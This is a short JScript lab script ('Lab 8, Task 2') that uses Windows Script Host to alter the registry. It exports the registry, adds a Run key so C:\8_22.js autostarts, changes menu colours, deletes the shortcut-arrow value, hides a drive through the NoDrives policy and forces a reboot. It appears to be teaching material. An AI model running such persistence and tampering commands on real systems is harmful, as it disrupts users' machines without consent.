//*********************************************************************************
//Name: 8_2.js
//Language: JScript
//Description: Lab 8, Task 2
//*********************************************************************************

var WshShell = WScript.CreateObject("WScript.Shell");

WshShell.Exec("regedit /e C:\\all.reg");
WScript.Sleep(10000);
WshShell.RegWrite("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\8_22","C:\\8_22.js","REG_SZ");
WshShell.RegWrite("HKEY_CURRENT_USER\\Control Panel\\Colors\\Menu","001 010 100","REG_SZ");
WshShell.RegDelete("HKEY_CLASSES_ROOT\\lnkfile\\IsShortcut");
WshShell.Regwrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives",4,"REG_DWORD");
WshShell.Exec("SHUTDOWN -r -f -t 15");